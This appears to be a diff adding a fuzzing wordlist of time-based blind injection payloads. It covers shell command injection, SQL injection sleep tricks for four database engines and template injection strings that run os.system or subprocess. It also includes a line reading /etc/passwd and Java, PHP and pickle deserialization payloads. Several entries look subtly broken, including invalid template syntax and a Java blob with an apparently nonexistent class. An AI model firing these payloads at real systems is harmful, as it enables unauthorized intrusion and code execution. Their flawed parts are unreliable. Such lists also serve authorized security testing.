@@ -1,0 +1,78 @@
+; sleep 10 #
+| sleep 10 #
+&& sleep 10 #
+|| sleep 10 #
+$(sleep 10)
+`sleep 10`
+; ping -n 11 127.0.0.1 #
+| ping -n 11 127.0.0.1 #
+&& ping -n 11 127.0.0.1 #
+$(ping -n 11 127.0.0.1)
+`ping -n 11 127.0.0.1`
+$(timeout 10s)
+`timeout 10s`
+; python -c 'import time; time.sleep(10)'
+| python -c 'import time; time.sleep(10)'
+; perl -e 'sleep(10)'
+| perl -e 'sleep(10)'
+; bash -c 'sleep 10'
+| bash -c 'sleep 10'
+
+' OR SLEEP(10)#
+" OR SLEEP(10)#
+' OR SLEEP(10)--
+" OR SLEEP(10)--
+1' OR SLEEP(10)#
+1" OR SLEEP(10)#
+1) OR SLEEP(10)--
+1) AND (SELECT SLEEP(10))--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10)#
+" UNION SELECT NULL,NULL,NULL WHERE SLEEP(10)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)#
+" AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+
+' OR pg_sleep(10)#
+" OR pg_sleep(10)#
+1' OR pg_sleep(10)--
+1" OR pg_sleep(10)--
+' UNION SELECT NULL,NULL,NULL WHERE pg_sleep(10)#
+" UNION SELECT NULL,NULL,NULL WHERE pg_sleep(10)--
+' AND (SELECT 1 FROM generate_series(1,10), pg_sleep(1))#
+" AND (SELECT 1 FROM generate_series(1,10), pg_sleep(1))--
+
+' OR WAITFOR DELAY '00:00:10'--
+" OR WAITFOR DELAY '00:00:10'--
+' AND 1=WAITFOR DELAY '00:00:10'--
+" AND 1=WAITFOR DELAY '00:00:10'--
+1) WAITFOR DELAY '00:00:10'--
+1) AND WAITFOR DELAY '00:00:10'--
+
+' OR dbms_pipe.receive_message('A',10)--
+" OR dbms_pipe.receive_message('A',10)--
+1) OR dbms_pipe.receive_message('A',10)--
+' AND dbms_pipe.receive_message('A',10) IS NOT NULL--
+" AND dbms_pipe.receive_message('A',10) IS NOT NULL--
+
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/bin/bash -c "sleep 10"', shell=True) }}
+{% import os %}
+{% os.system('sleep 10') %}
+{% import subprocess %}
+{% subprocess.Popen('sleep 10', shell=True) %}
+
+{{ system('sleep 10') }}
+{{ shell_exec('sleep 10') }}
+{{ exec('sleep 10') }}
+{{ 'sleep 10'|system }}
+
+{{ "".join(open('/etc/passwd').readlines()) }}
+{{ __import__('os').system('sleep 10') }}
+{{ __import__('subprocess').Popen('sleep 10', shell=True) }}
+
+rO0ABXNyACBqYXZhLnV0aWwuUGF5bG9hZExpc3Q7AAAAAAAAAAECAAFbQwAEaGVhZHEAfgABeHAAAAAEc3IAEWphdmEubmV0LlVSTG9va3VwAIsFr+XknPoCAAFMAAhmcmFnbWVudHEAfgABeHAAARQ=
+
+O:8:"Exploit":1:{s:6:"system";s:10:"sleep 10";}
+
+cos
+system
+(S'sleep 10'
+tR.
